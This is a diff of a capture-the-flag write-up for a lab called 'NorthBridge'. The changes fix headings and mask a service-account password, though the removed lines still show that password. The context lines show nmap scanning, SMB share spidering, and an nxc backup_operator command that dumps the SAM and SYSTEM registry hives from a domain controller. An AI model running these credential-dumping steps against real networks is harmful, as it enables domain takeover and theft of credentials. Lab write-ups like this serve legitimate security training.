@@ -74,7 +74,7 @@ Running nxc against 2 targets ━━━━━━━━━━━━━━━━�
 Interestingly, the given credentials can access both machines. We could hunt for GPP passwords in the SYSVOL of the domain controller, but the ```Network Shares``` on the host ```NORTHJMP01``` looks promising and we also gather the domain name so that can be added to the ```/etc/hosts```file just in case we need to perform ```kerberos``` attacks.
 For good mesure, lets run an ```nmap``` scan for both hosts, looking for unusual ports or easy wins. 
 
-# Nmap NORTHSC01
+# Nmap NORTHDC01
 ```bash
 ──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
 └─$ nmap -T4 -A -p- -Pn NORTHDC01.northbridge.corp
@@ -223,7 +223,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1088.51 seconds
 
 Both machines have port ```3389``` open, which is not unsual for windows servers, but not always present in CTFs.
 
-# Interesting files hunting
+# Hunting interesting files
 Going back to the ```Network Share``` found on ```NORTHJMP01```, we can enumerate the files using the once more ```nxc``` and spider_plus module 
 ```bash
 ┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
@@ -572,9 +572,9 @@ Now we can mark the ```_backupsvc``` used as owned on bloodhound and use its ```
 
 ```bash
 ┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
-└─$ nxc smb NORTHDC01 -u '_backupsvc' -p 'j0$QyPZ0JWzN2*iu^5' -M backup_operator
+└─$ nxc smb NORTHDC01 -u '_backupsvc' -p '************' -M backup_operator
 SMB         10.1.151.59     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:False)
-SMB         10.1.151.59     445    NORTHDC01        [+] northbridge.corp\_backupsvc:j0$QyPZ0JWzN2*iu^5 
+SMB         10.1.151.59     445    NORTHDC01        [+] northbridge.corp\_backupsvc:************ 
 BACKUP_O... 10.1.151.59     445    NORTHDC01        [*] Triggering RemoteRegistry to start through named pipe...
 BACKUP_O... 10.1.151.59     445    NORTHDC01        Saved HKLM\SAM to \\10.1.151.59\SYSVOL\SAM
 BACKUP_O... 10.1.151.59     445    NORTHDC01        Saved HKLM\SYSTEM to \\10.1.151.59\SYSVOL\SYSTEM
